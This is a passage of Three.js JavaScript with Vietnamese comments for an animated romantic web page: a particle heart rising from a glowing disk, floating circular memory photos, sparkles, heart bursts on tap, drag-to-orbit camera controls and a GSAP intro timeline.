            const streamPos = new Float32Array(this.streamCount * 3);
            const streamGoldCols = new Float32Array(this.streamCount * 3);
            const streamRedCols = new Float32Array(this.streamCount * 3);
            const streamSizes = new Float32Array(this.streamCount);
            this.streamParticles = [];

            for (let i = 0; i < this.streamCount; i++) {
                const i3 = i * 3;

                // 1. Điểm xuất phát ngẫu nhiên trên đĩa xoáy phía dưới
                const startAngle = Math.random() * Math.PI * 2;
                const startR = 0.35 + Math.random() * 2.6;
                const startPos = new THREE.Vector3(
                    Math.cos(startAngle) * startR,
                    0.02 + Math.random() * 0.08,
                    Math.sin(startAngle) * startR
                );

                // 2. Điểm đích gom sâu lên cao chạm và hòa nhập vào toàn bộ khối Trái Tim 3D
                const t = Math.random() * Math.PI * 2;
                const heartTheta = Math.random() * Math.PI * 2;
                // Khoảng cách từ đĩa (y=-4.85) lên trái tim (y=-0.85) là 4.0 đơn vị
                const hScale = 0.20 * (0.85 + Math.random() * 0.45);
                const hx = 16 * Math.pow(Math.sin(t), 3) * hScale;
                // hy bay thẳng lên vùng thân và cánh trên của trái tim (y: 3.85 -> 6.85 từ mặt đĩa)
                const hy = (13 * Math.cos(t) - 5 * Math.cos(2 * t) - 2 * Math.cos(3 * t) - Math.cos(4 * t)) * hScale + 4.65;
                const hz = Math.cos(heartTheta) * 2.85 * (0.35 + Math.abs(Math.sin(t)));
                const targetPos = new THREE.Vector3(hx, hy, hz);

                // Điểm uốn cong ngẫu nhiên tạo đường bay bồng bềnh
                const midAngle = startAngle + (Math.random() - 0.5) * 0.8;
                const midR = startR * 0.55 + 0.35;
                const midPos = new THREE.Vector3(
                    Math.cos(midAngle) * midR,
                    hy * 0.45 + (Math.random() - 0.5) * 0.2,
                    Math.sin(midAngle) * midR
                );

                const curve = new THREE.QuadraticBezierCurve3(startPos, midPos, targetPos);

                // Khởi tạo toàn bộ hạt nằm chờ sẵn ở mặt đĩa phía dưới (progress = 0) với độ trễ so le
                const progress = -Math.random() * 3.5;
                const currentPt = curve.getPoint(Math.max(0.0, progress));

                streamPos[i3] = currentPt.x;
                streamPos[i3 + 1] = currentPt.y;
                streamPos[i3 + 2] = currentPt.z;

                const gCol = randomChoice(goldPalette);
                const rCol = randomChoice(redPalette);

                streamGoldCols[i3] = gCol.r;
                streamGoldCols[i3 + 1] = gCol.g;
                streamGoldCols[i3 + 2] = gCol.b;

                streamRedCols[i3] = rCol.r;
                streamRedCols[i3 + 1] = rCol.g;
                streamRedCols[i3 + 2] = rCol.b;

                // Kích thước hạt đậm đà, rõ ràng (2.6 -> 4.8)
                streamSizes[i] = randomRange(2.6, 4.8);

                this.streamParticles.push({
                    startPos,
                    midPos,
                    targetPos,
                    curve,
                    progress,
                    // Tốc độ bay chậm rãi, mỗi hạt có vận tốc riêng độc lập
                    speed: randomRange(0.16, 0.38),
                    swaySpeed: randomRange(1.8, 3.8),
                    swayOffset: Math.random() * Math.PI * 2,
                    swayAmp: randomRange(0.015, 0.04)
                });
            }

            streamGeo.setAttribute('position', new THREE.BufferAttribute(streamPos, 3));
            streamGeo.setAttribute('aGoldColor', new THREE.BufferAttribute(streamGoldCols, 3));
            streamGeo.setAttribute('aRedColor', new THREE.BufferAttribute(streamRedCols, 3));
            streamGeo.setAttribute('aSize', new THREE.BufferAttribute(streamSizes, 1));

            this.streamUniforms = {
                uTexture: { value: createGlowDiscTexture(64) },
                uAlpha: { value: 0.0 },
                uColorMode: { value: 0.0 }
            };

            const streamVert = `
                attribute vec3 aGoldColor;
                attribute vec3 aRedColor;
                attribute float aSize;
                uniform float uAlpha;
                uniform float uColorMode;
                varying vec3 vColor;
                varying float vAlpha;

                void main() {
                    vec4 mvPos = modelViewMatrix * vec4(position, 1.0);
                    gl_Position = projectionMatrix * mvPos;
                    gl_PointSize = aSize * (17.5 / -mvPos.z);
                    vColor = mix(aGoldColor, aRedColor, uColorMode);
                    float yProg = clamp(position.y / 5.25, 0.0, 1.0);
                    float fadeIn = smoothstep(0.01, 0.12, yProg);
                    float fadeOut = 1.0 - smoothstep(0.90, 1.0, yProg);
                    vAlpha = uAlpha * fadeIn * fadeOut * 0.99;
                }
            `;

            const streamFrag = `
                uniform sampler2D uTexture;
                varying vec3 vColor;
                varying float vAlpha;

                void main() {
                    vec4 tex = texture2D(uTexture, gl_PointCoord);
                    if (tex.a < 0.05) discard;
                    gl_FragColor = vec4(vColor * 2.1, tex.a * vAlpha);
                }
            `;

            this.streamMaterial = new THREE.ShaderMaterial({
                uniforms: this.streamUniforms,
                vertexShader: streamVert,
                fragmentShader: streamFrag,
                transparent: true,
                depthWrite: false,
                blending: THREE.AdditiveBlending
            });

            this.streamPoints = new THREE.Points(streamGeo, this.streamMaterial);
            this.group.add(this.streamPoints);

            this.updateScale();
            this.streamActive = false;
        }

        updateScale() {
            const aspect = window.innerWidth / window.innerHeight;
            if (aspect < 1.0) {
                this.group.scale.setScalar(0.85);
            } else {
                const desktopScale = Math.min(0.92, Math.max(0.78, (window.innerHeight / 900) * 0.90));
                this.group.scale.setScalar(desktopScale);
            }
        }

        startStreamFlow() {
            this.streamActive = true;
            this.streamUniforms.uAlpha.value = 1.0;
        }

        update(time, delta = 0.016) {
            // 1. Xoáy đĩa hạt bồi tụ 14.000 hạt siêu dày đặc
            const diskPos = this.diskPoints.geometry.attributes.position.array;
            for (let i = 0; i < this.diskParticleCount; i++) {
                const d = this.diskData[i];
                d.angle += d.speed * delta;
                const i3 = i * 3;
                diskPos[i3] = Math.cos(d.angle) * d.radius;
                diskPos[i3 + 2] = Math.sin(d.angle) * d.radius;
                diskPos[i3 + 1] = d.heightOffset + Math.sin(time * 2.2 + d.pulsePhase) * 0.03;
            }
            this.diskPoints.geometry.attributes.position.needsUpdate = true;

            // 2. Cập nhật từng hạt bay RỜI RẠC, TÁCH TÁCH ĐỘC LẬP TỪ MẶT ĐĨA CHẢY TỪ TỪ LÊN TRÁI TIM (Trước & Sau đều nhau)
            if (this.streamActive) {
                const streamPos = this.streamPoints.geometry.attributes.position.array;
                for (let i = 0; i < this.streamCount; i++) {
                    const p = this.streamParticles[i];
                    p.progress += p.speed * delta;

                    if (p.progress >= 1.0) {
                        p.progress = 0.0;
                        const startAngle = Math.random() * Math.PI * 2;
                        const startR = 0.35 + Math.random() * 2.6;
                        p.startPos.set(Math.cos(startAngle) * startR, 0.02, Math.sin(startAngle) * startR);

                        const t = Math.random() * Math.PI * 2;
                        const heartTheta = Math.random() * Math.PI * 2;
                        const hScale = 0.20 * (0.85 + Math.random() * 0.45);
                        const hx = 16 * Math.pow(Math.sin(t), 3) * hScale;
                        const hy = (13 * Math.cos(t) - 5 * Math.cos(2 * t) - 2 * Math.cos(3 * t) - Math.cos(4 * t)) * hScale + 4.65;
                        const hz = Math.cos(heartTheta) * 2.85 * (0.35 + Math.abs(Math.sin(t)));
                        p.targetPos.set(hx, hy, hz);

                        const midAngle = startAngle + (Math.random() - 0.5) * 0.8;
                        const midR = startR * 0.55 + 0.35;
                        p.midPos.set(Math.cos(midAngle) * midR, hy * 0.45, Math.sin(midAngle) * midR);

                        p.curve = new THREE.QuadraticBezierCurve3(p.startPos, p.midPos, p.targetPos);
                        p.speed = randomRange(0.16, 0.38);
                    }

                    const clampedProg = Math.max(0.0, p.progress);
                    const pt = p.curve.getPoint(clampedProg);
                    const swayX = Math.sin(time * p.swaySpeed + p.swayOffset) * p.swayAmp;
                    const swayZ = Math.cos(time * p.swaySpeed + p.swayOffset) * p.swayAmp;

                    const i3 = i * 3;
                    streamPos[i3] = pt.x + (clampedProg > 0.0 ? swayX : 0);
                    streamPos[i3 + 1] = pt.y;
                    streamPos[i3 + 2] = pt.z + (clampedProg > 0.0 ? swayZ : 0);
                }
                this.streamPoints.geometry.attributes.position.needsUpdate = true;
            }

            this.group.position.y = this.baseY;
        }

        setAlpha(val) {
            this.globalAlpha = val;
            this.diskUniforms.uAlpha.value = val;
            this.streamUniforms.uAlpha.value = val;
        }

        setDiskAlpha(val) {
            this.diskUniforms.uAlpha.value = val;
        }

        setStreamAlpha(val) {
            this.streamUniforms.uAlpha.value = val;
        }

        setColorMode(val) {
            this.colorMode = val;
            this.diskUniforms.uColorMode.value = val;
            this.streamUniforms.uColorMode.value = val;
        }
    }

    // --- ParticleGround (Replaced by BlackHoleEnergyCore) ---
    class ParticleGround {
        constructor(scene) {
            return new BlackHoleEnergyCore(scene);
        }
    }

    // --- FloatingPhotosManager: 14 Circular Memory Photos floating gracefully up from bottom ---
    class FloatingPhotosManager {
        constructor(scene) {
            this.scene = scene;
            this.group = new THREE.Group();
            if (this.scene) {
                this.scene.add(this.group);
            }
            this.items = [];
            this.globalAlpha = 1.0;

            this.photoSources = [
                'oanh/2aoboquexdvcbvsz8cinmwxqicdler1hgp0vgr4y1.jpg',
                'oanh/2aoboquexda3umhp15tyb2tgkghvxdk1joresasc2.jpg',
                'oanh/2aoboquexdjfteyhkxclzcshb9rdqu4nn7xfziyg3.jpg',
                'oanh/2aoboquexdria5zzwwnw2ie1watj8xskollfnt5s4.jpg',
                'oanh/2aoboquexe89qmwpqx1yjx7tua4nr2wwabgrdjvm5.jpg',
                'oanh/2aoboquexevif84up2igmottas3hulsxhhxks6oo6.jpg',
                'oanh/2aoboquexedjfmvzcgdlhhabicdrnzddlwih9mio7.jpg',
                'oanh/2aoboquexelon2u5jsh7aiyflphhelwxym8x2rji8.jpg',
                'oanh/2aoboquexevecet47isxlcc2lxsnj55vmcuvqsxk9.jpg',
                'oanh/2aoboquexf1fyytefloicti6tvlu9niylgknawo010.jpg',
                'oanh/2aoboquexf9ifpuwquzsfzfbogei7vi9c3ainkmw11.jpg',
                'oanh/2aoboquexfknuu23lojprfkrvpw0yp2u1fkbki0012.jpg',
                'oanh/2aoboquexfwez2oxm6h6nszx4xsvpr3uywmzwbpq13.jpg',
                'oanh/2aoboque8viaujtapxmdv6nm0ozgxurjk0tpqjrq14.jpg'
            ];

            this.initPhotos();
        }

        initPhotos() {
            // Khởi tạo 35 đốm ảnh kỷ niệm tròn (~15px) bay lượn vừa vặn từ đáy
            const totalCount = 35;
            for (let i = 0; i < totalCount; i++) {
                const photoIdx = i % this.photoSources.length;
                const src = this.photoSources[photoIdx];
                const tex = createCircularMemoryPhotoTexture(src, photoIdx);

                const mat = new THREE.SpriteMaterial({
                    map: tex,
                    transparent: true,
                    opacity: 0.95,
                    depthWrite: false,
                    fog: false,
                    color: new THREE.Color(1.15, 1.15, 1.15)
                });

                const sprite = new THREE.Sprite(mat);

                // Tất cả xuất phát từ dưới đáy màn hình (y < -11.0) và bay trôi lên
                const isNarrow = window.innerWidth < window.innerHeight;
                const xSpan = isNarrow ? 4.8 : 8.5;
                const z = randomRange(-4.8, 2.5);
                const x = randomRange(-xSpan, xSpan);
                const y = -11.0 - (i * 0.38 + Math.random() * 0.3); // Xếp hàng dưới đáy
                sprite.position.set(x, y, z);

                // Kích thước tròn nhỏ xinh ~15px
                const baseScale = randomRange(0.36, 0.48);
                sprite.scale.set(baseScale, baseScale, 1.0);

                this.items.push({
                    sprite,
                    material: mat,
                    baseScale,
                    speedY: randomRange(0.55, 1.15),
                    swayFreq: randomRange(0.4, 1.3),
                    swayAmp: randomRange(0.25, 0.75),
                    phase: Math.random() * Math.PI * 2,
                    initialZ: z,
                    targetOpacity: 0.95
                });

                this.group.add(sprite);
            }
        }

        update(time, delta = 0.016) {
            const isNarrow = window.innerWidth < window.innerHeight;
            const xSpan = isNarrow ? 4.5 : 8.0;

            for (let i = 0; i < this.items.length; i++) {
                const item = this.items[i];
                const pos = item.sprite.position;

                // Bay lên từ từ từ dưới đáy lên trời
                pos.y += item.speedY * delta;
                pos.x += Math.sin(time * item.swayFreq + item.phase) * item.swayAmp * delta;
                pos.z = item.initialZ + Math.cos(time * 0.5 + item.phase) * 0.3;

                // Khi bay lên đỉnh màn hình (y > 4.2), reset lại vị trí dưới đáy
                if (pos.y > 4.2) {
                    pos.y = randomRange(-12.5, -11.0);
                    pos.x = randomRange(-xSpan, xSpan);
                    item.initialZ = randomRange(-4.5, 2.5);
                    pos.z = item.initialZ;
                }

                // Độ mờ dần khi trồi lên từ mép đáy hoặc biến mất ở mép đỉnh
                let fade = 1.0;
                if (pos.y < -9.2) {
                    fade = Math.max(0.0, (pos.y - (-11.0)) / 1.8);
                } else if (pos.y > 3.0) {
                    fade = Math.max(0.0, (4.2 - pos.y) / 1.2);
                }

                item.material.opacity = this.globalAlpha * item.targetOpacity * fade;
            }
        }

        setAlpha(val) {
            this.globalAlpha = val;
        }
    }

    // --- FloatingHearts ---
    class FloatingHearts {
        constructor(scene) {
            this.scene = scene;
            const perf = getPerformanceConfig();
            this.count = perf.floatingHeartCount;
            this.group = new THREE.Group();
            this.scene.add(this.group);
            this.hearts = [];
            this.globalAlpha = 0.0;
            this.initHearts();
        }

        initHearts() {
            const palette = ['#ff4d79', '#ff668a', '#ff1f5a', '#ff7a99', '#ffa3ba'];

            for (let i = 0; i < this.count; i++) {
                const col = palette[Math.floor(Math.random() * palette.length)];
                const tex = createHeartTexture(128, col);

                const material = new THREE.SpriteMaterial({
                    map: tex,
                    transparent: true,
                    opacity: 0,
                    blending: THREE.AdditiveBlending,
                    depthWrite: false
                });

                const sprite = new THREE.Sprite(material);
                const z = randomRange(-22, 6);
                const x = randomRange(-16, 16);
                const y = randomRange(-8, 14);
                sprite.position.set(x, y, z);

                const depthFactor = (z + 22) / 28;
                const baseScale = (0.5 + depthFactor * 1.3) * randomRange(0.85, 1.25);
                sprite.scale.set(baseScale, baseScale, 1.0);

                this.hearts.push({
                    sprite,
                    material,
                    baseScale,
                    speedY: randomRange(0.5, 1.4),
                    swayFreq: randomRange(0.5, 1.3),
                    swayAmp: randomRange(0.3, 0.9),
                    phase: Math.random() * Math.PI * 2,
                    initialZ: z,
                    targetOpacity: (0.35 + depthFactor * 0.45) * randomRange(0.7, 0.95)
                });
                this.group.add(sprite);
            }
        }

        update(time, delta) {
            for (let i = 0; i < this.hearts.length; i++) {
                const h = this.hearts[i];
                const pos = h.sprite.position;
                pos.y += h.speedY * delta;
                pos.x += Math.sin(time * h.swayFreq + h.phase) * h.swayAmp * delta;
                pos.z = h.initialZ + Math.cos(time * 0.7 + h.phase) * 0.3;

                if (pos.y > 15) {
                    pos.y = -9;
                    pos.x = randomRange(-16, 16);
                    h.initialZ = randomRange(-22, 6);
                    pos.z = h.initialZ;
                }
                h.material.opacity = this.globalAlpha * h.targetOpacity * (0.8 + 0.2 * Math.sin(time * 1.8 + h.phase));
            }
        }

        setAlpha(val) { this.globalAlpha = val; }
    }

    // --- FloatingTexts (Disabled) ---
    class FloatingTexts {
        constructor() {
            this.textItems = [];
            this.globalAlpha = 0.0;
        }
        update() {}
        setAlpha(val) { this.globalAlpha = val; }
    }

    // --- Sparkles ---
    class Sparkles {
        constructor(scene) {
            this.scene = scene;
            const perf = getPerformanceConfig();
            this.count = perf.sparkleCount;
            this.initGeometry();
            this.initMaterial();
            this.initPoints();
        }

        initGeometry() {
            this.geometry = new THREE.BufferGeometry();
            const positions = new Float32Array(this.count * 3);
            const colors = new Float32Array(this.count * 3);
            const sizes = new Float32Array(this.count);
            const phases = new Float32Array(this.count);
            const speeds = new Float32Array(this.count);

            const palette = [
                new THREE.Color('#ffffff'),
                new THREE.Color('#ffe4e1'),
                new THREE.Color('#ffd700'),
                new THREE.Color('#ffb6c1')
            ];

            for (let i = 0; i < this.count; i++) {
                const i3 = i * 3;
                const r = randomGaussian(0, 11);
                const theta = Math.random() * Math.PI * 2;
                const phi = Math.acos(Math.random() * 2 - 1);

                positions[i3] = r * Math.sin(phi) * Math.cos(theta);
                positions[i3 + 1] = r * Math.sin(phi) * Math.sin(theta) + 0.8;
                positions[i3 + 2] = r * Math.cos(phi);

                const col = palette[Math.floor(Math.random() * palette.length)];
                colors[i3] = col.r;
                colors[i3 + 1] = col.g;
                colors[i3 + 2] = col.b;

                sizes[i] = randomRange(16, 32);
                phases[i] = Math.random() * Math.PI * 2;
                speeds[i] = randomRange(1.2, 3.2);
            }

            this.geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
            this.geometry.setAttribute('aColor', new THREE.BufferAttribute(colors, 3));
            this.geometry.setAttribute('aSize', new THREE.BufferAttribute(sizes, 1));
            this.geometry.setAttribute('aPhase', new THREE.BufferAttribute(phases, 1));
            this.geometry.setAttribute('aSpeed', new THREE.BufferAttribute(speeds, 1));
        }

        initMaterial() {
            const sparkleTex = createSparkleTexture(128);
            this.uniforms = {
                uTime: { value: 0 },
                uTexture: { value: sparkleTex },
                uAlpha: { value: 0.0 }
            };

            const vertexShader = `
                attribute vec3 aColor;
                attribute float aSize;
                attribute float aPhase;
                attribute float aSpeed;
                uniform float uTime;
                uniform float uAlpha;
                varying vec3 vColor;
                varying float vAlpha;

                void main() {
                    vec4 mvPosition = modelViewMatrix * vec4(position, 1.0);
                    gl_Position = projectionMatrix * mvPosition;
                    float sparkle = pow(0.5 + 0.5 * sin(uTime * aSpeed + aPhase), 4.0);
                    gl_PointSize = (aSize * (0.3 + sparkle * 1.4)) * (11.0 / -mvPosition.z);
                    vColor = aColor + vec3(sparkle * 0.25);
                    vAlpha = uAlpha * (0.2 + 0.8 * sparkle);
                }
            `;

            const fragmentShader = `
                uniform sampler2D uTexture;
                varying vec3 vColor;
                varying float vAlpha;

                void main() {
                    vec4 texColor = texture2D(uTexture, gl_PointCoord);
                    if (texColor.a < 0.05) discard;
                    gl_FragColor = vec4(vColor * texColor.rgb, texColor.a * vAlpha);
                }
            `;

            this.material = new THREE.ShaderMaterial({
                uniforms: this.uniforms,
                vertexShader,
                fragmentShader,
                transparent: true,
                depthWrite: false,
                blending: THREE.AdditiveBlending
            });
        }

        initPoints() {
            this.points = new THREE.Points(this.geometry, this.material);
            this.scene.add(this.points);
        }

        update(time) { this.uniforms.uTime.value = time; }
        setAlpha(val) { this.uniforms.uAlpha.value = val; }
    }

    // --- HeartExplosionManager: Pure Glowing Hearts on Tap / Click ---
    class HeartExplosionManager {
        constructor(scene, camera) {
            this.scene = scene;
            this.camera = camera;
            this.explosions = [];
            this.heartTexture = createHeartTexture(128, '#ff2a6d');
        }

        createExplosion(screenX, screenY) {
            const vector = new THREE.Vector3(screenX, screenY, 0.5);
            vector.unproject(this.camera);
            const dir = vector.sub(this.camera.position).normalize();
            const distance = -this.camera.position.z / dir.z;
            const origin = this.camera.position.clone().add(dir.multiplyScalar(distance));

            const count = 35;
            const sprites = [];
            const group = new THREE.Group();
            this.scene.add(group);

            const palette = ['#ff003c', '#ff1744', '#ff4081', '#ff7597', '#ffffff'];

            for (let i = 0; i < count; i++) {
                const col = palette[Math.floor(Math.random() * palette.length)];
                const tex = createHeartTexture(128, col);

                const material = new THREE.SpriteMaterial({
                    map: tex,
                    transparent: true,
                    opacity: 1.0,
                    blending: THREE.AdditiveBlending,
                    depthWrite: false
                });

                const sprite = new THREE.Sprite(material);
                sprite.position.copy(origin);

                const scale = randomRange(0.4, 0.85);
                sprite.scale.set(scale, scale, 1.0);

                const theta = Math.random() * Math.PI * 2;
                const phi = Math.acos(Math.random() * 2 - 1);
                const speed = randomRange(3.0, 7.0);

                const vx = Math.sin(phi) * Math.cos(theta) * speed;
                const vy = (Math.sin(phi) * Math.sin(theta) * speed) + randomRange(1.2, 3.5);
                const vz = Math.cos(phi) * speed;

                sprites.push({
                    sprite,
                    material,
                    baseScale: scale,
                    vel: new THREE.Vector3(vx, vy, vz),
                    rotSpeed: randomRange(-2.0, 2.0)
                });

                group.add(sprite);
            }

            this.explosions.push({
                group,
                sprites,
                life: 1.0,
                decay: randomRange(0.65, 0.85)
            });
        }

        update(delta) {
            for (let i = this.explosions.length - 1; i >= 0; i--) {
                const exp = this.explosions[i];
                exp.life -= exp.decay * delta;

                if (exp.life <= 0) {
                    exp.sprites.forEach(s => {
                        if (s.material) s.material.dispose();
                    });
                    this.scene.remove(exp.group);
                    this.explosions.splice(i, 1);
                    continue;
                }

                const lifeCurve = Math.pow(exp.life, 1.4);

                exp.sprites.forEach(s => {
                    s.vel.x *= 0.96;
                    s.vel.y *= 0.96;
                    s.vel.z *= 0.96;
                    s.vel.y += 0.8 * delta;

                    s.sprite.position.addScaledVector(s.vel, delta);
                    s.material.opacity = lifeCurve;
                    
                    const sc = s.baseScale * (0.4 + 0.6 * lifeCurve);
                    s.sprite.scale.set(sc, sc, 1.0);
                });
            }
        }
    }

    // =========================================================================
    // 6. ANIMATION CONTROLLERS (Full 360 Interactive Orbit Drag + Centered)
    // =========================================================================
    class CameraAnimation {
        constructor(camera) {
            this.camera = camera;
            this.isDragging = false;
            this.prevPointer = { x: 0, y: 0 };
            // Góc xoay cầu: Cố định góc chính diện hoàn hảo 100% y hệt intro (phi = Math.PI * 0.5)
            this.spherical = {
                radius: (window.innerWidth < window.innerHeight) ? 14.2 : 12.8,
                theta: 0,           // Chính diện mặt trước (Z+)
                phi: Math.PI * 0.50 // Góc nhìn ngang song song với tâm (y = targetCenter.y)
            };
            this.targetSpherical = {
                radius: this.spherical.radius,
                theta: 0,
                phi: Math.PI * 0.50
            };
            // Tâm hệ thống cố định ở giữa Trái Tim và Đĩa (y = -3.85)
            this.targetCenter = new THREE.Vector3(0, -3.85, 0);
            this.currentLookAt = this.targetCenter.clone();

            const onPointerDown = (clientX, clientY) => {
                this.isDragging = true;
                this.prevPointer.x = clientX;
                this.prevPointer.y = clientY;
            };

            const onPointerMove = (clientX, clientY) => {
                if (!this.isDragging) return;
                const deltaX = clientX - this.prevPointer.x;
                const deltaY = clientY - this.prevPointer.y;
                this.prevPointer.x = clientX;
                this.prevPointer.y = clientY;

                // Xoay tròn 360 độ quanh trục thẳng đứng (Yaw Orbit)
                this.targetSpherical.theta -= deltaX * 0.0075;
                // Giới hạn góc nâng dao động nhẹ nhàng (+- 10 độ), giữ đĩa luôn luôn phẳng ngang
                this.targetSpherical.phi -= deltaY * 0.0025;
                this.targetSpherical.phi = Math.max(Math.PI * 0.38, Math.min(Math.PI * 0.48, this.targetSpherical.phi));
            };

            const onPointerUp = () => {
                this.isDragging = false;
            };

            // Chuột (Desktop)
            window.addEventListener('mousedown', (e) => {
                if (e.target.closest('#audio-toggle') || e.target.closest('#qr-toggle-btn') || e.target.closest('#qr-modal') || e.target.closest('#start-gate')) return;
                onPointerDown(e.clientX, e.clientY);
            });
            window.addEventListener('mousemove', (e) => onPointerMove(e.clientX, e.clientY));
            window.addEventListener('mouseup', onPointerUp);

            // Cảm ứng (Mobile / Tablet Touch)
            window.addEventListener('touchstart', (e) => {
                if (e.target.closest('#audio-toggle') || e.target.closest('#qr-toggle-btn') || e.target.closest('#qr-modal') || e.target.closest('#start-gate')) return;
                if (e.touches.length > 0) {
                    onPointerDown(e.touches[0].clientX, e.touches[0].clientY);
                }
            }, { passive: true });

            window.addEventListener('touchmove', (e) => {
                if (e.touches.length > 0) {
                    onPointerMove(e.touches[0].clientX, e.touches[0].clientY);
                }
            }, { passive: true });

            window.addEventListener('touchend', onPointerUp);
        }

        updateBaseZ() {
            this.spherical.radius = (window.innerWidth < window.innerHeight) ? 14.2 : 12.8;
            this.targetSpherical.radius = this.spherical.radius;
        }

        update(time, delta, isIntroFinished) {
            // Nội suy mượt mà góc xoay
            this.spherical.theta = lerp(this.spherical.theta, this.targetSpherical.theta, 0.1);
            this.spherical.phi = lerp(this.spherical.phi, this.targetSpherical.phi, 0.1);
            this.spherical.radius = lerp(this.spherical.radius, this.targetSpherical.radius, 0.1);

            // Tính toán vị trí camera theo tọa độ cầu quanh tâm
            const sinPhi = Math.sin(this.spherical.phi);
            const cosPhi = Math.cos(this.spherical.phi);
            const sinTheta = Math.sin(this.spherical.theta);
            const cosTheta = Math.cos(this.spherical.theta);

            this.camera.position.x = this.targetCenter.x + this.spherical.radius * sinPhi * sinTheta;
            this.camera.position.y = this.targetCenter.y + this.spherical.radius * cosPhi;
            this.camera.position.z = this.targetCenter.z + this.spherical.radius * sinPhi * cosTheta;

            this.camera.up.set(0, 1, 0);
            this.camera.lookAt(this.targetCenter);
        }
    }

    class IntroAnimation {
        constructor({ heart, ground, photosManager, floatingHearts, floatingTexts, sparkles, bloomPass, camera, flashOverlay }) {
            this.heart = heart;
            this.ground = ground;
            this.photosManager = photosManager;
            this.floatingHearts = floatingHearts;
            this.floatingTexts = floatingTexts;
            this.sparkles = sparkles;
            this.bloomPass = bloomPass;
            this.camera = camera;
            this.flashOverlay = flashOverlay;
            this.isFinished = false;
        }

        start() {
            const gsap = window.gsap;
            if (!gsap) {
                this.setCompleteState();
                return;
            }

            const isMobile = window.innerWidth < window.innerHeight;
            // Giữ nguyên khoảng cách gần, to rõ, vừa vặn cả trên PC và điện thoại
            const startZ = isMobile ? 14.2 : 12.8;
            const targetZ = isMobile ? 14.2 : 12.8;

            this.heart.setAlpha(0.0);
            this.heart.setConvergence(0.0);
            this.heart.setColorMode(0.0);
            this.ground.setAlpha(0.0);
            this.ground.setColorMode(0.0);
            if (this.photosManager) this.photosManager.setAlpha(1.0);
            this.floatingHearts.setAlpha(0.0);
            this.floatingTexts.setAlpha(0.0);
            this.sparkles.setAlpha(0.0);
            this.camera.position.set(0, -3.85, startZ);

            const tl = gsap.timeline({
                onComplete: () => { this.isFinished = true; }
            });

            // Phase 1: Star dust & Disk Core Reveal (Chỉ hiện đĩa dưới, tuyệt đối chưa có hạt/tia nào bay lên)
            tl.to({}, { duration: 0.1 });
            tl.to(this.sparkles.uniforms.uAlpha, { value: 0.85, duration: 1.0, ease: "power2.out" }, 0.1);
            if (this.ground.setDiskAlpha) this.ground.setDiskAlpha(0.0);
            if (this.ground.setStreamAlpha) this.ground.setStreamAlpha(0.0);
            
            tl.to(this.ground.diskUniforms.uAlpha, {
                value: 1.0,
                duration: 1.2,
                ease: "power2.out"
            }, 0.15);

            // Phase 2: Hạt năng lượng bắn vút từ LÕI ĐĨA lên -> Tụ ở tâm -> Bùng nở hình thành Trái Tim
            tl.to(this.heart.uniforms.uGlobalAlpha, { value: 1.0, duration: 0.6, ease: "power1.inOut" }, 0.35);
            tl.to(this.heart.uniforms.uConvergence, { value: 1.0, duration: 4.5, ease: "none" }, 0.45);
            tl.to(this.camera.position, { z: targetZ, y: -3.85, duration: 4.8, ease: "sine.inOut" }, 0.45);

            // KHI TRÁI TIM ĐÃ BẮN LÊN & HÌNH THÀNH XONG (tại giây 4.2), KÍCH HOẠT DÒNG HẠT BẮT ĐẦU TỪ TỪ NÂNG LÊN TỪ ĐĨA
            tl.add(() => {
                if (this.ground && this.ground.startStreamFlow) {
                    this.ground.startStreamFlow();
                }
            }, 4.2);

            // Phase 3: Lóe sáng chói lọi & Chớp nổ Supernova Flash
            if (this.heart.uniforms.uExplode) {
                tl.to(this.heart.uniforms.uExplode, { value: 1.0, duration: 0.42, ease: "power2.in" }, 5.1);
                tl.to(this.heart.uniforms.uExplode, { value: 0.0, duration: 0.8, ease: "power3.out" }, 5.52);
            }

            if (this.bloomPass) {
                tl.to(this.bloomPass, { strength: 2.4, radius: 0.65, duration: 0.5, ease: "power2.in" }, 4.9);
                tl.to(this.bloomPass, { strength: 5.8, radius: 0.9, duration: 0.32, ease: "power4.in" }, 5.4);
            }

            if (this.flashOverlay) {
                tl.to(this.flashOverlay, { opacity: 1.0, duration: 0.28, ease: "power3.in" }, 5.45);
            }

            // Chuyển sang Trái Tim Đỏ & Hố Đen Ruby ngay đỉnh điểm chớp pháo hoa, bắt đầu đập và nở bung ảnh
            tl.add(() => {
                this.heart.setColorMode(1.0);
                this.heart.revealPhoto(1.2);
                if (this.ground.setColorMode) this.ground.setColorMode(1.0);
                document.body.classList.add('red-world');
            }, 5.75);

            if (this.flashOverlay) {
                tl.to(this.flashOverlay, { opacity: 0.0, duration: 0.75, ease: "power2.out" }, 5.8);
            }

            if (this.bloomPass) {
                tl.to(this.bloomPass, { strength: 0.95, radius: 0.48, duration: 0.85, ease: "power2.out" }, 5.8);
            }

            // Phase 4: Thế Giới Đỏ vô tận cùng 14 bức ảnh kỷ niệm & trái tim bay lượn
            if (this.photosManager) tl.to(this.photosManager, { globalAlpha: 0.95, duration: 1.8, ease: "power2.out" }, 6.0);
            tl.to(this.floatingHearts, { globalAlpha: 0.85, duration: 1.6, ease: "power2.out" }, 6.2);
            tl.to(this.floatingTexts, { globalAlpha: 0.95, duration: 1.8, ease: "power2.out" }, 6.3);
        }

        setCompleteState() {
            this.heart.setAlpha(1.0);
            this.heart.setConvergence(1.0);
            this.heart.setColorMode(1.0);
            this.heart.revealPhoto(0.1);
            this.ground.setAlpha(0.95);
            this.ground.setColorMode(1.0);
            if (this.photosManager) this.photosManager.setAlpha(0.95);
            this.floatingHearts.setAlpha(0.85);
            this.floatingTexts.setAlpha(0.95);
            this.sparkles.setAlpha(0.8);
            this.camera.position.set(0, 0.6, 12.0);
            if (this.bloomPass) {
                this.bloomPass.strength = 0.9;
                this.bloomPass.radius = 0.45;
                this.bloomPass.threshold = 0.42;
            }
            this.isFinished = true;
            document.body.classList.add('red-world');
            if (this.flashOverlay) this.flashOverlay.style.opacity = '0';
        }
    }

    // =========================================================================
    // 7. MAIN ENGINE BOOTSTRAP
    // =========================================================================
    class LoveExperienceApp {
        constructor() {
            this.config = getActiveLoveConfig();
            this.canvas = document.getElementById('webgl-canvas');
            this.flashOverlay = document.getElementById('flash-overlay');
            this.startGate = document.getElementById('start-gate');
            this.audioBtn = document.getElementById('audio-toggle');
            this.bgMusic = document.getElementById('bg-music');
            this.hasStarted = false;
            this.clock = new THREE.Clock();

            this.initThree();
            this.initSceneObjects();
            this.initAudioAndGate();
            this.initInteractions();

            this.animate = this.animate.bind(this);
            requestAnimationFrame(this.animate);
        }

        initThree() {
            this.scene = new THREE.Scene();
